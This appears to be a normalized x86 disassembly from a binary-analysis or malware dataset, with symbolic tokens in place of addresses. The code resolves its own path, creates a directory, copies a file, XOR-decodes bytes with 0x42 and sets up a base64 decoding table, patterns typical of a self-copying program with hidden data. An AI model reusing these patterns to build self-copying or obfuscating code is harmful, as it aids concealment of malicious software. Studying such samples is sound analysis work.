mov [ ebp - 0x4 ] 0x15
cmp edi ebx
jne r-xdata
push esi
call sub_406b10
add esp 0x4
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
push 0x1
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x4 ] 0x3
call sub_402ca0
mov eax [ ebp - 0x48 ]
mov esi [ ebp - 0x4c ]
cmp esi eax
mov [ ebp - 0x4 ] 0x2
mov edi eax
je r-xdata
push ebx
mov ecx esi
call sub_406850
add esi 0x10
cmp esi edi
jne r-xdata
mov edx [ ebp - 0xa0 ]
lea ecx [ ebp - 0x68 ]
push ecx
mov ecx [ ebp - 0x20 ]
push edx
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_405140
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x12
test eax eax
jbe r-xdata
mov eax r--data
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + 0x8 ]
push edx
lea edx [ ebp - 0x110 ]
push edx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
push ebx
push eax
call [ ecx + 0x4 ]
mov eax [ ebp - 0x74 ]
cmp eax ebx
je r-xdata
mov eax r--data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ ebp - 0x214 ]
mov eax ecx
mov esi edi
mov edi edx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ ebp - 0x1c ]
mov [ ebp - 0x30 ] cl
lea ecx [ ebp - 0x30 ]
call sub_402ca0
mov edx [ r--data ]
lea eax [ ebp - 0x1c ]
push edx
push ebx
push eax
lea ecx [ ebp - 0x30 ]
call sub_402a00
mov eax [ r--data ]
push 0x1
lea ecx [ ebp + 0x1b ]
push eax
push ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x16
mov [ ebp + 0x1b ] 0x5c
call sub_405e00
lea ecx [ ebp - 0x30 ]
mov esi eax
call sub_4030c0
mov eax [ ebp - 0x28 ]
cmp eax esi
jae r-xdata
mov edi r--data
push esi
call sub_406b10
add esp 0x4
lea ecx [ ebp - 0x98 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
push 0x1
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4 ] 0x1
call sub_402ca0
push 0x1
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x0
call sub_402ca0
push 0x1
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_402ca0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
push ebx
mov ecx esi
call sub_406850
add esi 0x10
cmp esi edi
jne r-xdata
mov esi [ ebp - 0x3c ]
mov ecx [ ebp - 0x2c ]
test ecx ecx
jne r-xdata
cmp eax esi
dec al
mov [ ecx - 0x1 ] al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x74 ] ebx
cmp eax ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x6c ] ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
cmp esi ebx
jbe r-xdata
mov esi eax
mov esi [ ebp - 0x4c ]
push ebx
push 0x1
push eax
push ecx
call sub_4076b7
add esp 0x10
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0xf
push 0x1
call sub_402ca0
mov ecx r--data
mov edi r--data
test ecx ecx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
lea eax [ ebp - 0x214 ]
push ebx
push eax
call [ CreateDirectoryA@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x2c ]
sub eax esi
push eax
lea edx [ ecx + esi ]
push edx
push ecx
call sub_407270
mov edi [ ebp - 0x28 ]
add esp 0xc
sub edi esi
lea ecx [ ebp - 0x30 ]
push ebx
push edi
call sub_402e80
test al al
je r-xdata
mov eax r--data
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x30 ]
call sub_405e80
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x28 ]
lea edi [ ecx + esi ]
jmp r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x15
call sub_402ca0
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x13
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x60 ]
lea edx [ ebp - 0xcc ]
push ecx
push rw-data
push edx
call sub_406590
lea ecx [ ebp - 0x30 ]
lea edx [ ebp - 0xbc ]
push ecx
mov bl 0x17
push eax
push edx
mov [ ebp - 0x4 ] bl
call sub_406460
add esp 0x18
mov ecx [ r--data ]
mov [ ebp - 0x4 ] 0x18
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x60 ]
call sub_402a00
push 0x1
lea ecx [ ebp - 0xbc ]
mov [ ebp - 0x4 ] bl
call sub_402ca0
push 0x1
lea ecx [ ebp - 0xcc ]
mov [ ebp - 0x4 ] 0x16
call sub_402ca0
mov eax [ ebp - 0x5c ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] edi
mov [ edx + edi ] 0x0
mov ecx [ ebp - 0x2c ]
jb r-xdata
lea ecx [ ebp - 0x30 ]
call sub_405e80
mov ecx [ ebp - 0x2c ]
lea eax [ ecx + esi ]
jmp r-xdata
cmp eax esi
jb r-xdata
dec al
mov [ ecx ] al
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
test al al
je r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
jne r-xdata
mov eax r--data
mov dl [ edi ]
xor dl 0x42
inc esi
mov [ eax ] dl
mov eax [ ebp - 0x28 ]
cmp eax esi
ja r-xdata
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
mov eax [ ebp - 0x5c ]
test eax eax
jne r-xdata
mov ecx r--data
dec al
mov [ ecx ] al
jmp r-xdata
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + 0x8 ]
push edx
lea edx [ ebp - 0x110 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push eax
call [ ecx + 0x4 ]
xor ebx ebx
mov eax r--data
sub_404840
push 0xffffffff
push sub_40e15f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x50
push ebx
push ebp
push esi
push edi
mov ebp ecx
mov [ esp + 0x10 ] 0x0
mov al [ esp + 0x70 ]
push 0x0
lea ecx [ esp + 0x44 ]
mov [ esp + 0x6c ] 0x1
mov [ esp + 0x44 ] al
call sub_402ca0
mov cl [ esp + 0x70 ]
push 0x0
mov [ esp + 0x34 ] cl
lea ecx [ esp + 0x34 ]
mov [ esp + 0x6c ] 0x2
call sub_402ca0
mov dl [ esp + 0x70 ]
push 0x0
lea ecx [ esp + 0x24 ]
mov [ esp + 0x6c ] 0x3
mov [ esp + 0x24 ] dl
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x28 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov bl 0x4
[ edi ]
not ecx
dec ecx
mov [ esp + 0x68 ] bl
push ecx
push rw-data
lea ecx [ esp + 0x48 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x38 ]
call sub_402c00
mov al [ esp + 0x30 ]
sub esp 0x10
mov esi esp
mov [ esp + 0x24 ] esp
push 0x0
mov ecx esi
mov [ esi ] al
call sub_402ca0
mov ecx [ r--data ]
lea edx [ esp + 0x40 ]
push ecx
push 0x0
push edx
mov ecx esi
call sub_402a00
sub esp 0x10
mov [ esp + 0x88 ] 0x5
mov ecx esp
mov [ esp + 0x38 ] esp
lea eax [ esp + 0x60 ]
push eax
call sub_405a60
sub esp 0x10
lea edx [ esp + 0xa4 ]
mov ecx esp
mov [ esp + 0x4c ] esp
push edx
mov [ esp + 0x9c ] 0x6
call sub_405a60
lea eax [ esp + 0x80 ]
mov ecx ebp
push eax
mov [ esp + 0x9c ] bl
call sub_4056c0
mov ecx [ r--data ]
mov [ esp + 0x68 ] 0x7
push ecx
push 0x0
push eax
lea ecx [ esp + 0x2c ]
call sub_402a00
mov [ esp + 0x68 ] bl
mov ebx 0x1
push ebx
lea ecx [ esp + 0x54 ]
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x28 ]
[ edi ]
not ecx
dec ecx
xor edi edi
push ecx
push rw-data
push edx
push edi
lea ecx [ esp + 0x30 ]
call sub_406910
mov esi [ esp + 0x70 ]
cmp eax edi
mov al [ esp + 0x20 ]
push edi
mov [ esi ] al
mov ecx esi
je r-xdata
call sub_402ca0
mov ecx [ r--data ]
lea edx [ esp + 0x20 ]
push ecx
push edi
push edx
mov ecx esi
call sub_402a00
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x6c ] 0x3
call sub_402ca0
mov ecx [ esp + 0x34 ]
cmp ecx edi
je r-xdata
call sub_402ca0
mov ecx [ r--data ]
lea edx [ esp + 0x20 ]
push ecx
push edi
push edx
mov ecx esi
call sub_402a00
mov [ esp + 0x10 ] ebx
push ebx
lea ecx [ esp + 0x24 ]
mov [ esp + 0x6c ] 0x3
call sub_402ca0
push ebx
lea ecx [ esp + 0x34 ]
mov [ esp + 0x6c ] 0x2
call sub_402ca0
push ebx
lea ecx [ esp + 0x44 ]
mov [ esp + 0x6c ] bl
call sub_402ca0
push ebx
lea ecx [ esp + 0x78 ]
mov [ esp + 0x6c ] 0x0
call sub_402ca0
jmp r-xdata
mov ecx [ esp + 0x44 ]
mov [ esp + 0x34 ] edi
cmp ecx edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] edi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x60 ]
mov eax esi
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x5c
retn 0x14
mov ecx [ esp + 0x78 ]
mov [ esp + 0x44 ] edi
cmp ecx edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] edi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_404b20
push 0xffffffff
push sub_40e1a0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
push ebx
push ebp
push esi
push edi
mov ebp ecx
mov al [ esp + 0x5c ]
push 0x0
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] 0x0
mov [ esp + 0x40 ] al
call sub_402ca0
mov cl [ esp + 0x5c ]
push 0x0
mov [ esp + 0x20 ] cl
lea ecx [ esp + 0x20 ]
mov [ esp + 0x58 ] 0x1
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov bl 0x2
[ edi ]
not ecx
dec ecx
mov [ esp + 0x54 ] bl
push ecx
push rw-data
lea ecx [ esp + 0x44 ]
call sub_402c00
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x24 ]
call sub_402c00
mov dl [ esp + 0x1c ]
sub esp 0x10
mov esi esp
mov [ esp + 0x20 ] esp
push 0x0
mov ecx esi
mov [ esi ] dl
call sub_402ca0
mov eax [ r--data ]
lea ecx [ esp + 0x2c ]
push eax
push 0x0
push ecx
mov ecx esi
call sub_402a00
sub esp 0x10
lea edx [ esp + 0x5c ]
mov ecx esp
mov [ esp + 0x34 ] esp
push edx
mov [ esp + 0x78 ] 0x3
call sub_405a60
sub esp 0x10
lea eax [ esp + 0x8c ]
mov ecx esp
mov [ esp + 0x48 ] esp
push eax
mov [ esp + 0x88 ] 0x4
call sub_405a60
lea ecx [ esp + 0x5c ]
mov [ esp + 0x84 ] bl
push ecx
mov ecx ebp
call sub_4056c0
mov [ esp + 0x54 ] 0x5
mov edi rw-data
or ebp 0xffffffff
xor eax eax
mov ecx ebp
mov edx [ esp + 0x34 ]
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
push eax
lea ecx [ esp + 0x3c ]
call sub_406910
test eax eax
je r-xdata
push 0x1
lea ecx [ esp + 0x30 ]
mov [ esp + 0x58 ] bl
call sub_402ca0
push 0x1
lea ecx [ esp + 0x20 ]
mov [ esp + 0x58 ] 0x1
call sub_402ca0
push 0x1
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] 0x0
call sub_402ca0
mov ecx [ esp + 0x60 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
mov eax 0x1
mov al [ ecx - 0x1 ]
test al al
je r-xdata
push eax
call sub_4078c3
add esp 0x4
mov esi eax
test esi esi
mov [ esp + 0x54 ] bl
push 0x1
lea ecx [ esp + 0x30 ]
jg r-xdata
mov eax r--data
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
call sub_402ca0
push 0x1
lea ecx [ esp + 0x20 ]
mov [ esp + 0x58 ] 0x1
call sub_402ca0
push 0x1
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] 0x0
call sub_402ca0
push 0x1
lea ecx [ esp + 0x60 ]
mov [ esp + 0x58 ] ebp
call sub_402ca0
mov eax esi
jmp r-xdata
call sub_402ca0
push 0x1
lea ecx [ esp + 0x20 ]
mov [ esp + 0x58 ] 0x1
call sub_402ca0
push 0x1
lea ecx [ esp + 0x40 ]
mov [ esp + 0x58 ] 0x0
call sub_402ca0
push 0x1
lea ecx [ esp + 0x60 ]
mov [ esp + 0x58 ] ebp
call sub_402ca0
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x48
retn 0x10
sub_404d60
push 0xffffffff
push sub_40e1d8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push ebp
push esi
push edi
mov al [ esp + 0x70 ]
xor ebp ebp
push ebp
lea ecx [ esp + 0x14 ]
mov [ esp + 0x3c ] 0x2
mov [ esp + 0x14 ] al
call sub_402ca0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
lea ecx [ esp + 0x18 ]
call sub_402c00
mov ebx [ esp + 0x70 ]
mov [ esp + 0x38 ] 0x3
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
push eax
push ecx
mov ecx ebx
call sub_405f00
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebp
push edx
lea ecx [ esp + 0x4c ]
call sub_405d70
cmp eax 0xffffffff
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ esp + 0x58 ]
mov edx [ esp + 0x64 ]
test edx edx
lea ebp [ ecx + eax ]
jne r-xdata
mov ebx [ ebx + 0x8 ]
sub ebx eax
sar ebx 0x4
xor ebx ebx
jmp r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebp
push edx
lea ecx [ esp + 0x4c ]
call sub_405d70
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov edx r--data
mov ecx [ esp + 0x44 ]
mov [ esp + 0x14 ] edi
cmp ecx edi
mov [ esp + 0x18 ] edi
mov [ esp + 0x1c ] edi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx edi
je r-xdata
mov esi [ esp + 0x54 ]
mov edx esi
lea eax [ esp + 0x20 ]
sub edx ebp
lea ecx [ esp + 0x40 ]
push edx
push ebp
push eax
call sub_405b80
mov ecx [ r--data ]
mov [ esp + 0x38 ] 0x4
push ecx
push 0x0
push eax
lea ecx [ esp + 0x1c ]
call sub_402a00
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0x3c ] 0x3
call sub_402ca0
mov eax [ ebx + 0x8 ]
lea edx [ esp + 0x10 ]
push edx
push 0x1
push eax
mov ecx ebx
call sub_406070
mov ecx [ esp + 0x68 ]
lea ebp [ ecx + esi ]
jmp r-xdata
cmp esi edi
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] edi
mov [ esp + 0x4c ] edi
je r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov esi [ esp + 0x54 ]
mov edx r--data
test esi esi
je r-xdata
mov ecx [ esp + 0x64 ]
cmp ecx edi
je r-xdata
mov al [ esi - 0x1 ]
test al al
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov ecx [ esp + 0x30 ]
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2c
retn 0x34
mov al [ ecx - 0x1 ]
test al al
je r-xdata
dec esi
push esi
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ esi - 0x1 ] al
jmp r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_404f60
push 0xffffffff
push sub_40e1fb
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x218
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x28 ]
xor ebx ebx
push 0x100
push eax
push ebx
mov [ esp + 0x20 ] ebx
call [ GetModuleFileNameA@IAT ]
push ebx
lea ecx [ esp + 0x12c ]
push ebx
lea edx [ esp + 0x1c ]
push ecx
lea eax [ esp + 0x34 ]
push edx
push eax
call sub_4078ce
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x3c ]
add esp 0x14
[ edi ]
or ecx 0xffffffff
lea edi [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x28 ]
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x28 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x28 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x128 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x28 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0x1
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
mov al [ esp + 0x17 ]
and ecx 0x3
mov [ esp + 0x1c ] al
[ edi ] [ esi ]
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x20 ] ebx
[ edi ]
not ecx
dec ecx
mov [ esp + 0x24 ] ebx
mov ebp ecx
lea ecx [ esp + 0x1c ]
push ebp
mov [ esp + 0x2c ] ebx
call sub_402e80
test al al
je r-xdata
mov esi [ esp + 0x238 ]
mov cl [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x230 ] ebx
mov [ esi ] cl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov edx [ r--data ]
mov ecx esi
push edx
push ebx
push eax
call sub_402a00
mov ecx [ esp + 0x1c ]
cmp ecx ebx
je r-xdata
mov edi [ esp + 0x1c ]
mov ecx ebp
mov edx ecx
lea esi [ esp + 0x28 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ esp + 0x1c ]
mov [ esp + 0x20 ] ebp
mov [ eax + ebp ] bl
mov ecx [ esp + 0x228 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x224
retn 0x4
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
sub_405140
push 0xffffffff
push sub_40e21b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x98
push ebx
xor ebx ebx
push esi
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] bl
mov [ esp + 0x25 ] bl
mov [ esp + 0x26 ] bl
mov [ esp + 0x27 ] bl
mov [ esp + 0x28 ] bl
mov [ esp + 0x29 ] bl
mov [ esp + 0x2a ] bl
mov [ esp + 0x2b ] bl
mov [ esp + 0x2c ] bl
mov [ esp + 0x2d ] bl
mov [ esp + 0x2e ] bl
mov [ esp + 0x2f ] bl
mov [ esp + 0x30 ] bl
mov [ esp + 0x31 ] bl
mov [ esp + 0x32 ] bl
mov [ esp + 0x33 ] bl
mov [ esp + 0x34 ] bl
mov [ esp + 0x35 ] bl
mov [ esp + 0x36 ] bl
mov [ esp + 0x37 ] bl
mov [ esp + 0x38 ] bl
mov [ esp + 0x39 ] bl
mov [ esp + 0x3a ] bl
mov [ esp + 0x3b ] bl
mov [ esp + 0x3c ] bl
mov [ esp + 0x3d ] bl
mov [ esp + 0x3e ] bl
mov [ esp + 0x3f ] bl
mov [ esp + 0x40 ] bl
mov [ esp + 0x41 ] bl
mov [ esp + 0x42 ] bl
mov [ esp + 0x43 ] bl
mov [ esp + 0x44 ] bl
mov [ esp + 0x45 ] bl
mov [ esp + 0x46 ] bl
mov [ esp + 0x47 ] bl
mov [ esp + 0x48 ] bl
mov [ esp + 0x49 ] bl
mov [ esp + 0x4a ] bl
mov [ esp + 0x4b ] bl
mov [ esp + 0x4c ] bl
mov [ esp + 0x4d ] bl
mov [ esp + 0x4e ] bl
mov [ esp + 0x4f ] 0x3e
mov [ esp + 0x50 ] bl
mov [ esp + 0x51 ] bl
mov [ esp + 0x52 ] bl
mov [ esp + 0x53 ] 0x3f
mov [ esp + 0x54 ] 0x34
mov [ esp + 0x55 ] 0x35
mov [ esp + 0x56 ] 0x36
mov [ esp + 0x57 ] 0x37
mov [ esp + 0x58 ] 0x38
mov [ esp + 0x59 ] 0x39
mov [ esp + 0x5a ] 0x3a
mov [ esp + 0x5b ] 0x3b
mov [ esp + 0x5c ] 0x3c
mov [ esp + 0x5d ] 0x3d
mov [ esp + 0x5e ] bl
mov [ esp + 0x5f ] bl
mov [ esp + 0x60 ] bl
mov [ esp + 0x61 ] bl
mov [ esp + 0x62 ] bl
mov [ esp + 0x63 ] bl
mov [ esp + 0x64 ] bl
mov [ esp + 0x65 ] bl
mov [ esp + 0x66 ] 0x1
mov [ esp + 0x67 ] 0x2
mov [ esp + 0x68 ] 0x3
mov [ esp + 0x69 ] 0x4
mov [ esp + 0x6a ] 0x5
mov [ esp + 0x6b ] 0x6
mov [ esp + 0x6c ] 0x7
mov [ esp + 0x6d ] 0x8
mov [ esp + 0x6e ] 0x9
mov [ esp + 0x6f ] 0xa
mov [ esp + 0x70 ] 0xb
mov al [ esp + 0xb ]
mov [ esp + 0x71 ] 0xc
mov [ esp + 0x72 ] 0xd
mov [ esp + 0x73 ] 0xe
mov [ esp + 0x74 ] 0xf
mov [ esp + 0x75 ] 0x10
mov [ esp + 0x76 ] 0x11
mov [ esp + 0x77 ] 0x12
mov [ esp + 0x78 ] 0x13
mov [ esp + 0x79 ] 0x14
mov [ esp + 0x7a ] 0x15
mov [ esp + 0x7b ] 0x16
mov [ esp + 0x7c ] 0x17
mov [ esp + 0x7d ] 0x18
mov [ esp + 0x7e ] 0x19
mov [ esp + 0x7f ] bl
mov [ esp + 0x80 ] bl
mov [ esp + 0x81 ] bl
mov [ esp + 0x82 ] bl
mov [ esp + 0x83 ] bl
mov [ esp + 0x84 ] bl
mov [ esp + 0x85 ] 0x1a
mov [ esp + 0x86 ] 0x1b
mov [ esp + 0x87 ] 0x1c
mov [ esp + 0x88 ] 0x1d
mov [ esp + 0x89 ] 0x1e
mov [ esp + 0x8a ] 0x1f
mov [ esp + 0x8b ] 0x20
mov [ esp + 0x8c ] 0x21
mov [ esp + 0x8d ] 0x22
mov [ esp + 0x8e ] 0x23
mov [ esp + 0x8f ] 0x24
mov [ esp + 0x90 ] 0x25
mov [ esp + 0x91 ] 0x26
mov [ esp + 0x92 ] 0x27
mov [ esp + 0x93 ] 0x28
mov [ esp + 0x94 ] 0x29
mov [ esp + 0x95 ] 0x2a
mov [ esp + 0x96 ] 0x2b
mov [ esp + 0x97 ] 0x2c
mov [ esp + 0x98 ] 0x2d
mov [ esp + 0x99 ] 0x2e
mov [ esp + 0x9a ] 0x2f
mov [ esp + 0x9b ] 0x30
mov [ esp + 0x9c ] 0x31
mov [ esp + 0x9d ] 0x32
mov [ esp + 0x9e ] 0x33
mov [ esp + 0xc ] al
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov eax [ esp + 0xb8 ]
mov [ esp + 0xa8 ] ebx
cmp eax ebx
mov [ esp + 0x1c ] ebx
jle r-xdata
mov esi [ esp + 0xb0 ]
mov dl [ esp + 0xc ]
lea ecx [ esp + 0xc ]
mov [ esi ] dl
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov eax [ r--data ]
push eax
push ebx
push ecx
mov ecx esi
call sub_402a00
mov ecx [ esp + 0x10 ]
cmp ecx ebx
je r-xdata
push ebp
mov ebp [ esp + 0xc0 ]
push edi
mov edi [ esp + 0xbc ]
mov ecx [ esp + 0xa0 ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0xa4
retn 0x10
mov al [ ecx - 0x1 ]
cmp al bl
je r-xdata
mov eax [ esp + 0x24 ]
inc edi
inc eax
cmp al 0xa
je r-xdata
dec ecx
push ecx
call sub_406b10
add esp 0x4
cmp al 0xff
je r-xdata
mov al [ edi ]
cmp al 0xd
je r-xdata
pop edi
pop ebp
movsx ecx al
movsx edx [ edi + 0x1 ]
movsx eax [ esp + ecx + 0x2c ]
shl eax 0x12
inc edi
movsx ecx [ esp + edx + 0x2c ]
mov edx [ r--data ]
shl ecx 0xc
add eax ecx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x28 ] eax
sub edx ecx
inc edi
sar eax 0x10
cmp edx 0x1
mov [ esp + 0x13 ] al
ja r-xdata
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
mov eax [ esp + 0x1c ]
push ebx
lea ecx [ esp + 0x18 ]
lea esi [ eax + 0x1 ]
push esi
call sub_402e80
test al al
je r-xdata
call sub_406b1b
mov edx [ ebp ]
inc edx
mov [ ebp ] edx
mov al [ edi ]
cmp al 0x3d
je r-xdata
movsx ecx [ esp + 0x13 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
add edx eax
mov ch cl
mov [ edx ] cl
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] esi
mov [ ecx + esi ] bl
mov eax [ esp + 0x24 ]
add eax 0x4
jmp r-xdata
movsx edx al
mov eax [ esp + 0x28 ]
movsx ecx [ esp + edx + 0x2c ]
mov edx [ r--data ]
shl ecx 0x6
add eax ecx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x28 ] eax
sub edx ecx
inc edi
sar eax 0x8
cmp edx 0x1
mov [ esp + 0x13 ] al
ja r-xdata
mov [ esp + 0x24 ] eax
mov ecx eax
cmp ecx [ esp + 0xc0 ]
jl r-xdata
mov eax [ esp + 0x1c ]
lea ecx [ esp + 0x14 ]
lea esi [ eax + 0x1 ]
call sub_402fa0
cmp eax esi
